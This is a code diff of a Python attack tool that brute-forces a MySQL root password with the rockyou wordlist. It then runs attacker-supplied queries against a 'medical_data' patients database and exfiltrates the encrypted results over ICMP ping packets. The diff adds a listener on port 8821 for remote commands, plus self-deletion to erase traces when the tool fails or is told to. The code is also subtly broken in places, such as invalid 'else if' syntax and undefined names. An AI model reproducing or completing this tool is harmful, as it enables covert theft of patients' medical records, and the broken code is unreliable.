@@ -6,10 +6,6 @@ from itertools import cycle
 import random
 import string
 
-os.chdir(sys._MEIPASS)
-
-# Crack password
-
 # function that checks if pw is correct
 def connect(pw):
     try:
@@ -23,9 +19,8 @@ def connect(pw):
         return("wrong")
 
 # Cracks the password, given a wordlist and a sql host (as root)
-def getPassword(wordlist, host):
+def getPassword(wordlist):
     for word in wordlist:
-        print(word)
         if connect(word)=='success':
             pw = word
             return pw
@@ -50,7 +45,7 @@ def get_data(pw, query):
 
         cursor.execute("use medical_data;")
 
-        cursor.execute(query) #"select * from patients where name = 'Our Guy';"
+        cursor.execute(query)
         result = cursor.fetchall()
     except mysql.connector.Error as err:
         return err
@@ -141,7 +136,7 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
                     "SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
                     % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay, recPacket[36:]))
                 time.sleep(1)
-                ret = ("SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms" % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay)
+                ret = ("SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms" % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay))
                 return ret
         except socket.timeout:
             ret = ("Request timeout for icmp_seq %d" % ICMP_SEQ)
@@ -155,34 +150,41 @@ def main():
     wordlist=open("rockyou-75.txt","r+").read().splitlines()
     password = getPassword(wordlist)
     if password == "NO PASSWORD":
-        raise ValueError ("Wordlist didn't contain password to MySQL DB.")
+         pw=False
 
-    server_socket = socket.socket(socket.AF_INET,
-                  socket.SOCK_STREAM)
-    server_socket.bind((host, 8821))
 
-    server_socket.listen(1)
-
-    (client_socket, client_address) = server_socket.accept()
-    client_socket.send("I'm in the MySQL database. Send me a query, or type EXIT to shut me down!")
     while True:
-        client_input = client_socket.recv(1024)
-        if !client_input:
-            client_socket.send("I'm in the MySQL database. Send me a query, or type EXIT to shut me down.")
-        else:
-            if client_input.decode() == 'EXIT':
-                break
-            else:
-                sql_result = get_data(password, client_input.decode())
-                client_socket.send("Received MySQL data")
-                data = encrypt_data(sql_result)
-                client_socket.send("Query Encrypted.")
-                client_socket.send("Sending encrypted data via ICMP ping.")
-                result = sendOnePing(1, client, 102, data)
-                client_socket.send(result)
+        server_socket = socket.socket(socket.AF_INET,
+                      socket.SOCK_STREAM)
+        server_socket.bind((host, 8821))
 
-    client_socket.close()
-    server_socket.close()
+        server_socket.listen(1)
+
+        (client_socket, client_address) = server_socket.accept()
+        if pw==False:
+                client_socket.send(b"I couldn't get into the MySQL db with the provided wordlist. Shutting down connection and deleting payload.")
+                os.remove(argv[0])
+                sys.exit()
+        client_socket.send(b"I'm in the MySQL database. Send me a query, or type EXIT to shut me down!")
+        while True:
+            client_input = client_socket.recv(1024)
+            if not client_input:
+                client_socket.send(b"I'm in the MySQL database. Send me a query, type EXIT to shut me down or DELETE to get rid of any trace I was here.")
+            else:
+                if client_input.decode() == 'EXIT':
+                    break
+                else if client_input.decode() == 'DELETE':
+                    os.remove(argv[0]+"testing")
+                    sys.exit()
+                else:
+                    sql_result = get_data(password, client_input.decode())
+                    client_socket.send(b"Received MySQL data. Sending in an ICMP ping!")
+                    data = encrypt_data(sql_result)
+                    result = sendOnePing(1, client, 102, data)
+                    client_socket.send(result.decode())
+
+        client_socket.close()
+        server_socket.close()
 
 if __name__ == "__main__":
     main()
